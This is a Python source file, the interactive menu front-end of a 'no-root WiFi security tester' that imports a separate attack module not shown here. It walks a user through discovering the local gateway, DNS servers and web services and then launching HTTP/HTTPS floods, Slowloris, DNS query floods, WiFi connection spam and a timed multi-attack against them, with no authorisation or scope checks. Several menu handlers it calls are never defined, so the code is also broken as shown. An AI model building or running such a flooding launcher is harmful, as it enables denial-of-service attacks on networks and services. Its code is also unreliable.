#!/usr/bin/env python3
"""
WiFi Security Tester - No Root GUI
==================================

Interactive GUI for no-root WiFi security testing
"""

import os
import sys
import time
import threading
from wifi_noroot_tester import NoRootWiFiTester

class NoRootGUI:
    def __init__(self):
        self.tester = NoRootWiFiTester()
        self.targets = {}
        self.attack_thread = None
    
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def main_menu(self):
        """Display main menu"""
        while True:
            self.clear_screen()
            self.tester.banner()
            
            print("\n[NO-ROOT MAIN MENU]")
            print("=" * 60)
            print("1.  🔍 Discover Network Targets")
            print("2.  🌐 HTTP/HTTPS Flood Attacks")
            print("3.  🐌 Slowloris Attack")
            print("4.  📡 DNS Query Flooding")
            print("5.  🔌 Socket Connection Flooding")
            print("6.  📶 WiFi Attacks (No Root)")
            print("7.  🎯 Multi-Attack Sequence")
            print("8.  📊 Attack Statistics")
            print("9.  ❌ Exit")
            print("=" * 60)
            
            choice = input("\n[?] Select option (1-9): ").strip()
            
            if choice == '1':
                self.discover_targets_menu()
            elif choice == '2':
                self.http_attacks_menu()
            elif choice == '3':
                self.slowloris_menu()
            elif choice == '4':
                self.dns_attacks_menu()
            elif choice == '5':
                self.socket_attacks_menu()
            elif choice == '6':
                self.wifi_attacks_menu()
            elif choice == '7':
                self.multi_attack_menu()
            elif choice == '8':
                self.statistics_menu()
            elif choice == '9':
                self.exit_program()
            else:
                input("[!] Invalid option! Press Enter to continue...")
    
    def discover_targets_menu(self):
        """Discover network targets"""
        self.clear_screen()
        print("[🔍 NETWORK TARGET DISCOVERY]")
        print("=" * 50)
        
        print("[*] Discovering network targets...")
        self.targets = self.tester.discover_network_targets()
        
        if self.targets:
            print("\n[+] Discovered targets:")
            
            if 'gateway' in self.targets:
                print(f"  Gateway: {self.targets['gateway']}")
            
            if 'dns_servers' in self.targets:
                print(f"  DNS Servers: {', '.join(self.targets['dns_servers'])}")
            
            if 'web_services' in self.targets:
                print(f"  Web Services: {', '.join(self.targets['web_services'])}")
        else:
            print("[!] No targets discovered!")
        
        input("\nPress Enter to continue...")
    
    def http_attacks_menu(self):
        """HTTP/HTTPS attacks menu"""
        self.clear_screen()
        print("[🌐 HTTP/HTTPS FLOOD ATTACKS]")
        print("=" * 50)
        print("1. HTTP GET Flood")
        print("2. HTTPS Flood")
        print("3. HTTP POST Flood")
        print("4. Bandwidth Test Attack")
        print("5. Back to Main Menu")
        
        choice = input("\n[?] Select attack (1-5): ").strip()
        
        if choice == '1':
            self.http_get_flood_config()
        elif choice == '2':
            self.https_flood_config()
        elif choice == '3':
            self.http_post_flood_config()
        elif choice == '4':
            self.bandwidth_test_config()
        elif choice == '5':
            return
    
    def http_get_flood_config(self):
        """Configure HTTP GET flood"""
        print("\n[🌐 HTTP GET FLOOD CONFIG]")
        
        target_url = input("[?] Target URL (e.g., http://192.168.1.1): ").strip()
        if not target_url:
            print("[!] URL required!")
            input("Press Enter to continue...")
            return
        
        threads = input("[?] Number of threads (default 50): ").strip()
        threads = int(threads) if threads else 50
        
        requests = input("[?] Requests per thread (default 1000): ").strip()
        requests = int(requests) if requests else 1000
        
        print(f"\n[*] Starting HTTP GET flood...")
        print(f"[*] Target: {target_url}")
        print(f"[*] Threads: {threads}")
        print(f"[*] Press Ctrl+C to stop")
        
        try:
            self.tester.running = True
            self.tester.http_flood_attack(target_url, threads, requests)
            
            while self.tester.running:
                self.tester.update_stats()
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Attack stopped by user")
        
        self.tester.stop_all_attacks()
        input("Press Enter to continue...")
    
    def slowloris_menu(self):
        """Slowloris attack menu"""
        self.clear_screen()
        print("[🐌 SLOWLORIS ATTACK]")
        print("=" * 50)
        
        target_host = input("[?] Target host/IP: ").strip()
        if not target_host:
            print("[!] Target host required!")
            input("Press Enter to continue...")
            return
        
        port = input("[?] Target port (default 80): ").strip()
        port = int(port) if port else 80
        
        connections = input("[?] Number of connections (default 200): ").strip()
        connections = int(connections) if connections else 200
        
        print(f"\n[*] Starting Slowloris attack...")
        print(f"[*] Target: {target_host}:{port}")
        print(f"[*] Connections: {connections}")
        print(f"[*] Press Ctrl+C to stop")
        
        try:
            self.tester.running = True
            self.tester.slowloris_attack(target_host, port, connections)
            
            while self.tester.running:
                self.tester.update_stats()
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Attack stopped by user")
        
        self.tester.stop_all_attacks()
        input("Press Enter to continue...")
    
    def dns_attacks_menu(self):
        """DNS attacks menu"""
        self.clear_screen()
        print("[📡 DNS QUERY FLOODING]")
        print("=" * 50)
        
        # Show discovered DNS servers
        if 'dns_servers' in self.targets:
            print("[+] Discovered DNS servers:")
            for i, dns in enumerate(self.targets['dns_servers']):
                print(f"  {i+1}. {dns}")
        
        target_dns = input("\n[?] Target DNS server IP: ").strip()
        if not target_dns:
            if 'dns_servers' in self.targets:
                target_dns = self.targets['dns_servers'][0]
                print(f"[*] Using discovered DNS: {target_dns}")
            else:
                print("[!] DNS server required!")
                input("Press Enter to continue...")
                return
        
        threads = input("[?] Number of threads (default 30): ").strip()
        threads = int(threads) if threads else 30
        
        queries = input("[?] Queries per thread (default 1000): ").strip()
        queries = int(queries) if queries else 1000
        
        print(f"\n[*] Starting DNS query flood...")
        print(f"[*] Target DNS: {target_dns}")
        print(f"[*] Threads: {threads}")
        print(f"[*] Press Ctrl+C to stop")
        
        try:
            self.tester.running = True
            self.tester.dns_query_flood(target_dns, threads, queries)
            
            while self.tester.running:
                self.tester.update_stats()
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Attack stopped by user")
        
        self.tester.stop_all_attacks()
        input("Press Enter to continue...")
    
    def wifi_attacks_menu(self):
        """WiFi attacks menu (no root)"""
        self.clear_screen()
        print("[📶 WiFi ATTACKS (NO ROOT)]")
        print("=" * 50)
        print("1. WiFi Scanning Attack")
        print("2. WiFi Connection Spam")
        print("3. Back to Main Menu")
        
        choice = input("\n[?] Select attack (1-3): ").strip()
        
        if choice == '1':
            print("\n[*] Starting WiFi scanning attack...")
            print("[*] This will perform continuous WiFi scans")
            print("[*] Press Ctrl+C to stop")
            
            try:
                self.tester.running = True
                self.tester.wifi_scan_attack()
            except KeyboardInterrupt:
                print("\n[*] Attack stopped by user")
            
            self.tester.stop_all_attacks()
            input("Press Enter to continue...")
        
        elif choice == '2':
            print("\n[*] Starting WiFi connection spam...")
            print("[*] This will spam connection attempts to fake SSIDs")
            print("[*] Press Ctrl+C to stop")
            
            try:
                self.tester.running = True
                self.tester.wifi_connection_spam()
                
                while self.tester.running:
                    self.tester.update_stats()
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[*] Attack stopped by user")
            
            self.tester.stop_all_attacks()
            input("Press Enter to continue...")
        
        elif choice == '3':
            return
    
    def multi_attack_menu(self):
        """Multi-attack sequence menu"""
        self.clear_screen()
        print("[🎯 MULTI-ATTACK SEQUENCE]")
        print("=" * 50)
        
        if not self.targets:
            print("[*] Discovering targets first...")
            self.targets = self.tester.discover_network_targets()
        
        if not self.targets:
            print("[!] No targets found for multi-attack!")
            input("Press Enter to continue...")
            return
        
        duration = input("[?] Attack duration in seconds (default 60): ").strip()
        duration = int(duration) if duration else 60
        
        print(f"\n[*] Starting multi-attack sequence...")
        print(f"[*] Duration: {duration} seconds")
        print(f"[*] Targets: {len(self.targets)} categories")
        print(f"[*] Press Ctrl+C to stop early")
        
        try:
            self.tester.run_multi_attack(self.targets, duration)
        except KeyboardInterrupt:
            print("\n[*] Multi-attack stopped by user")
        
        input("Press Enter to continue...")
    
    def statistics_menu(self):
        """Show attack statistics"""
        self.clear_screen()
        print("[📊 ATTACK STATISTICS]")
        print("=" * 50)
        
        print(f"Total requests sent: {self.tester.packet_count}")
        
        if hasattr(self.tester, 'start_time') and self.tester.start_time:
            elapsed = time.time() - self.tester.start_time
            rps = self.tester.packet_count / elapsed if elapsed > 0 else 0
            print(f"Requests per second: {rps:.2f}")
            print(f"Attack duration: {elapsed:.1f} seconds")
        
        print(f"Active threads: {len(self.tester.threads)}")
        print(f"Targets discovered: {len(self.targets)}")
        
        if self.targets:
            print("\nTarget categories:")
            for category, targets in self.targets.items():
                if isinstance(targets, list):
                    print(f"  {category}: {len(targets)} targets")
                else:
                    print(f"  {category}: {targets}")
        
        input("\nPress Enter to continue...")
    
    def exit_program(self):
        """Exit program"""
        print("\n[*] Stopping all attacks and exiting...")
        self.tester.stop_all_attacks()
        print("[+] Goodbye!")
        sys.exit(0)

def main():
    print("[+] WiFi Security Tester - No Root Edition")
    print("[+] No root privileges required!")
    
    try:
        gui = NoRootGUI()
        gui.main_menu()
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        print("[*] Cleaning up...")

if __name__ == "__main__":
    main()